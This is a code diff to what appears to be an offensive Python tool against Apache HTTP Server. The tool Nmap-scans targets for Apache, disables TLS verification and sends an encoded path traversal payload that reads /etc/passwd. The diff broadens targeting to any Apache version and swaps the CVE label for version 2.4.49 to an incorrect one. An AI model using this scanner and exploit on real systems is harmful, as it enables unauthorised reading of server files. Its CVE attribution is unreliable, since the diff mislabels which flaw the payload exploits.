@@ -13,8 +13,10 @@ ssl._create_default_https_context = ssl._create_unverified_context
 
 def run_nmap_scan(target_ip, target_port=None):
     """Runs an Nmap scan to find services and returns the results."""
-    def scan(port_range):
+    def scan(port_range, additional_args=None):
         nmap_args = ["nmap", "-sV", "-T5", "-Pn", f"-p{port_range}", target_ip]
+        if additional_args:
+            nmap_args.extend(additional_args)
         try:
             print(f"Running Nmap with arguments: {' '.join(nmap_args)}")
             scan_results = subprocess.run(nmap_args, capture_output=True, text=True, check=True)
@@ -27,22 +29,29 @@ def run_nmap_scan(target_ip, target_port=None):
             return f"Unexpected error: {e}"
 
     if target_port:
-        return scan(target_port)
+        result = scan(target_port)
+        print(f"Scan result for port {target_port}: {result}")
+        return filter_apache_services(result)
 
     # Scan port 80 first
     result = scan("80")
+    print(f"Scan result for port 80: {result}")
     filtered_result = filter_apache_services(result)
-    if "Apache/2.4.49" in filtered_result or "Apache/2.4.50" in filtered_result:
+    print(f"Filtered result for port 80: {filtered_result}")
+    if "Apache" in filtered_result:
         return filtered_result
 
     # Scan port 443 if Apache is not found on port 80
     result = scan("443")
+    print(f"Scan result for port 443: {result}")
     filtered_result = filter_apache_services(result)
-    if "Apache/2.4.49" in filtered_result or "Apache/2.4.50" in filtered_result:
+    print(f"Filtered result for port 443: {filtered_result}")
+    if "Apache" in filtered_result:
         return filtered_result
 
     # Scan all ports if Apache is not found on ports 80 and 443
     result = scan("1-65535")
+    print(f"Scan result for all ports: {result}")
     return filter_apache_services(result)
 
 def filter_apache_services(scan_result):
@@ -120,7 +129,7 @@ def pathTraversal(url):
         return ""
     version = resp.headers.get('server', '')
     if "49" in version:
-        cve_id = "CVE-2021-41773"
+        cve_id = "CVE-2021-42013"
         payload = "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" 
         return exploitPT(url, payload, cve_id)
 
